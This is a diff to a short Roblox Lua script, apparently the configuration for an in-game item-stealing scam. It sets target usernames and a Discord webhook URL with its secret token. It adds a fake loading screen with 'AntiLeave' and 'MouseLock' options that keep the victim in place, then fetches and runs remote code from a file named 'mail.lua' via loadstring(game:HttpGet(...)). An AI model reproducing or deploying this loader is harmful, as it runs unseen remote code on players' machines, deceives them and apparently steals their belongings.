@@ -1,4 +1,16 @@
-UserName = "GiffddPro"
-UserName2 = "GiffddWhat"
-Webhook = "https://discord.com/api/webhooks/1097340088259723284/qYvFCBRcsMg_osjBtXj6xsSL3JMYeoHPrWdF_dAqL3qaGg-Of1EaFluNpKCpe3V5LlXB"
-loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
+UserName = "GiffddWhat"
+UserName2 = "GiffddPro"
+Webhook = "https://discord.com/api/webhooks/1100233847825768598/NjbOP_VdSUqvYUbBX0x1mhfnrKdqpbXEMtUxybPnrOFLcUsSurk9QvBpciTtQ5cJ9Z0l"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 60 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
